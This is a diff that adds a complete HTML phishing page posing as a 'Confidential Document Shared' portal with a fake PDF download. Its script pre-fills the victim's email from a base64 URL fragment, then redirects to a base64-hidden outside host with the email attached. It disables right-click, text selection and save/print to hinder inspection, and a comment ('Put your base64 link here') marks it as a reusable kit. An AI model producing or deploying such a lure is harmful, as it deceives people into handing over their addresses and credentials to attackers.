@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.tailwindcss.com https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com https://readdy.ai data:; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://readdy.ai;">
+<title>Confidential Document Shared</title>
+<script src="https://cdn.tailwindcss.com/3.4.16"></script>
+<script>tailwind.config={theme:{extend:{colors:{primary:'#3b82f6',secondary:'#1d4ed8'},borderRadius:{'none':'0px','sm':'4px',DEFAULT:'8px','md':'12px','lg':'16px','xl':'20px','2xl':'24px','3xl':'32px','full':'9999px','button':'8px'}}}}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
+<style>
+@font-face {
+font-family: 'remixicon';
+src: url('https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/fonts/remixicon.woff2') format('woff2');
+}
+[class^="ri-"] {
+font-family: 'remixicon' !important;
+font-style: normal;
+-webkit-font-smoothing: antialiased;
+-moz-osx-font-smoothing: grayscale;
+}
+* {
+user-select: none;
+-webkit-user-select: none;
+-moz-user-select: none;
+-ms-user-select: none;
+}
+[class^="ri-"] {
+display: inline-block;
+font-family: 'remixicon' !important;
+font-style: normal;
+-webkit-font-smoothing: antialiased;
+-moz-osx-font-smoothing: grayscale;
+speak: none;
+font-feature-settings: "liga" 1;
+font-variant: normal;
+text-transform: none;
+line-height: 1;
+}
+@keyframes pulse {
+0%, 100% { transform: scale(1); }
+50% { transform: scale(1.05); }
+}
+@keyframes fadeIn {
+0% { opacity: 0; }
+100% { opacity: 1; }
+}
+@keyframes shimmer {
+0% { background-position: -200% 0; }
+100% { background-position: 200% 0; }
+}
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+.animate-pulse {
+animation: pulse 2s infinite;
+}
+.animate-fadeIn {
+animation: fadeIn 0.5s ease-in-out;
+}
+.animate-shimmer {
+background: linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,0.2), rgba(255,255,255,0));
+background-size: 200% 100%;
+animation: shimmer 2s infinite;
+}
+.animate-spin {
+animation: spin 1s linear infinite;
+}
+.gradient-bg {
+background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+position: relative;
+overflow: hidden;
+}
+.gradient-bg::before {
+content: '';
+position: absolute;
+top: 0;
+left: 0;
+right: 0;
+bottom: 0;
+background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0));
+}
+.loading-overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(0, 0, 0, 0.7);
+display: none;
+justify-content: center;
+align-items: center;
+z-index: 9999;
+}
+.document-icon {
+position: relative;
+width: 60px;
+height: 70px;
+background-color: #f1f5f9;
+border-radius: 4px;
+margin: 0 auto;
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+.document-icon::before {
+content: "";
+position: absolute;
+top: 0;
+right: 0;
+width: 15px;
+height: 15px;
+background-color: #f1f5f9;
+border-radius: 0 0 0 4px;
+}
+.document-icon::after {
+content: "";
+position: absolute;
+top: 0;
+right: 0;
+width: 0;
+height: 0;
+border-style: solid;
+border-width: 0 15px 15px 0;
+border-color: transparent #e2e8f0 transparent transparent;
+}
+.document-text {
+font-size: 10px;
+color: #ef4444;
+font-weight: bold;
+margin-top: 5px;
+text-align: center;
+}
+.document-extension {
+font-size: 8px;
+color: #64748b;
+text-transform: uppercase;
+margin-top: 2px;
+}
+.custom-checkbox {
+appearance: none;
+-webkit-appearance: none;
+width: 20px;
+height: 20px;
+border: 2px solid #3b82f6;
+border-radius: 4px;
+outline: none;
+cursor: pointer;
+position: relative;
+}
+.custom-checkbox:checked {
+background-color: #3b82f6;
+}
+.custom-checkbox:checked::after {
+content: "";
+position: absolute;
+top: 3px;
+left: 6px;
+width: 6px;
+height: 10px;
+border: solid white;
+border-width: 0 2px 2px 0;
+transform: rotate(45deg);
+}
+</style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.pointer-events-none{pointer-events:none}.absolute{position:absolute}.relative{position:relative}.inset-y-0{top:0px;bottom:0px}.left-0{left:0px}.mx-auto{margin-left:auto;margin-right:auto}.my-4{margin-top:1rem;margin-bottom:1rem}.mb-1{margin-bottom:0.25rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.ml-2{margin-left:0.5rem}.mr-2{margin-right:0.5rem}.mt-1{margin-top:0.25rem}.mt-4{margin-top:1rem}.block{display:block}.flex{display:flex}.h-10{height:2.5rem}.h-16{height:4rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.w-10{width:2.5rem}.w-16{width:4rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-8{width:2rem}.w-full{width:100%}.max-w-4xl{max-width:56rem}.max-w-md{max-width:28rem}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.whitespace-nowrap{white-space:nowrap}.\!rounded-button{border-radius:8px !important}.rounded{border-radius:8px}.rounded-button{border-radius:8px}.rounded-full{border-radius:9999px}.border{border-width:1px}.border-4{border-width:4px}.border-b{border-bottom-width:1px}.border-t{border-top-width:1px}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-primary{--tw-border-opacity:1;border-color:rgb(59 130 246 / var(--tw-border-opacity, 1))}.border-t-transparent{border-top-color:transparent}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-primary{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-white\/20{background-color:rgb(255 255 255 / 0.2)}.p-6{padding:1.5rem}.px-4{padding-left:1rem;padding-right:1rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.py-8{padding-top:2rem;padding-bottom:2rem}.pl-10{padding-left:2.5rem}.pl-3{padding-left:0.75rem}.pr-3{padding-right:0.75rem}.text-center{text-align:center}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-200{transition-duration:200ms}.hover\:bg-primary\/90:hover{background-color:rgb(59 130 246 / 0.9)}.focus\:border-primary:focus{--tw-border-opacity:1;border-color:rgb(59 130 246 / var(--tw-border-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-primary:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(59 130 246 / var(--tw-ring-opacity, 1))}@media (min-width: 768px){.md\:p-8{padding:2rem}.md\:text-2xl{font-size:1.5rem;line-height:2rem}}</style></head>
+<body class="bg-gray-50 min-h-screen" oncontextmenu="return false">
+<div class="loading-overlay animate-fadeIn" id="loadingOverlay">
+<div class="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
+</div>
+<header class="gradient-bg py-6 px-4 text-white shadow-md">
+<div class="max-w-4xl mx-auto flex items-center justify-between">
+<div class="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
+<i class="ri-lock-line text-white text-xl w-6 h-6 flex items-center justify-center"></i>
+</div>
+<h1 class="text-xl md:text-2xl font-bold text-center">Confidential Document Shared</h1>
+<div class="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
+<i class="ri-shield-check-line text-white text-xl w-6 h-6 flex items-center justify-center"></i>
+</div>
+</div>
+</header>
+<main class="py-8 px-4 animate-fadeIn">
+<div class="max-w-md mx-auto bg-white rounded shadow-lg p-6 md:p-8">
+<div class="mb-6 text-center">
+<div class="document-icon mb-4">
+<div class="document-text">PDF</div>
+<div class="document-extension">file</div>
+</div>
+<h2 class="text-lg font-semibold text-gray-800">Shared Document 102982892983.pdf</h2>
+<p class="text-sm text-gray-500 mt-1">Confidential document • 18 MB</p>
+</div>
+<div class="border-t border-b border-gray-200 py-4 my-4">
+<p class="text-sm text-gray-600 mb-4">This document contains sensitive information. Please verify your email to access.</p>
+<form id="downloadForm" class="space-y-4">
+<div>
+<label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+<div class="relative">
+<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+<i class="ri-mail-line text-gray-400 text-lg w-5 h-5 flex items-center justify-center"></i>
+</div>
+<input type="email" id="email" name="email" class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary text-sm" placeholder="Enter your email address" required="">
+</div>
+</div>
+<div class="flex items-start">
+<input type="checkbox" id="terms" name="terms" class="custom-checkbox mt-1" required="">
+<label for="terms" class="ml-2 block text-sm text-gray-600">
+I acknowledge that this document is confidential and agree to the terms of use
+</label>
+</div>
+<button type="submit" class="w-full flex items-center justify-center py-2 px-4 bg-primary hover:bg-primary/90 text-white font-medium rounded-button transition-colors duration-200 !rounded-button whitespace-nowrap">
+<i class="ri-download-line mr-2 text-lg w-5 h-5 flex items-center justify-center"></i>
+Download Document
+</button>
+</form>
+</div>
+<div class="text-center">
+<p class="text-xs text-gray-500">Document will expire in 7 days</p>
+<div class="flex items-center justify-center mt-4 space-x-4">
+<div class="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100">
+<i class="ri-lock-line text-gray-500 w-5 h-5 flex items-center justify-center"></i>
+</div>
+<div class="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100">
+<i class="ri-eye-off-line text-gray-500 w-5 h-5 flex items-center justify-center"></i>
+</div>
+<div class="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100">
+<i class="ri-time-line text-gray-500 w-5 h-5 flex items-center justify-center"></i>
+</div>
+</div>
+</div>
+</div>
+</main>
+<footer class="py-4 text-center text-xs text-gray-500">
+<p>© 2025 Secure Document Portal. All rights reserved.</p>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+
+
+// Function to generate random number
+ function _0x3764(length = 5) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+	
+ var tenHag = _0x3764();
+// Extract email from URL hash if present
+const hash = window.location.hash.substring(1);
+if (hash) {
+try {
+// Try normal decoding first
+let email = decodeURIComponent(hash);
+// If that doesn't look like an email, try base64
+if (!email.includes('@')) {
+email = atob(hash);
+}
+if (email.includes('@')) {
+document.getElementById('email').value = email;
+}
+} catch (e) {
+console.error('Failed to decode hash');
+}
+}
+// Form submission handler
+document.getElementById('downloadForm').addEventListener('submit', function(e) {
+e.preventDefault();
+const emailInput = document.getElementById('email');
+const email = emailInput.value.trim();
+if (!email || !email.includes('@')) {
+emailInput.classList.add('border-red-500');
+return;
+}
+
+document.getElementById('loadingOverlay').style.display = 'flex';
+// Create FormData object
+const formData = new FormData();
+formData.append('email', email);
+formData.append('domain', window.location.hostname);
+
+var codU = 'aHR0cHM6Ly90aXZuLmd1ZXN0YWNjZXNzcG9ydGFsLmNvbS8='; // Put your base64 link here
+var dcodU = atob(codU);
+var codeU = email;
+// Simulate form submission and redirect
+setTimeout(function() {
+// Redirect with email as hash
+window.location.href = `${dcodU}${codeU}`;
+}, 1500);
+});
+});
+
+document.addEventListener('contextmenu', function(e) {
+e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
+e.preventDefault();
+}
+});
+</script></body>
+
+</html>
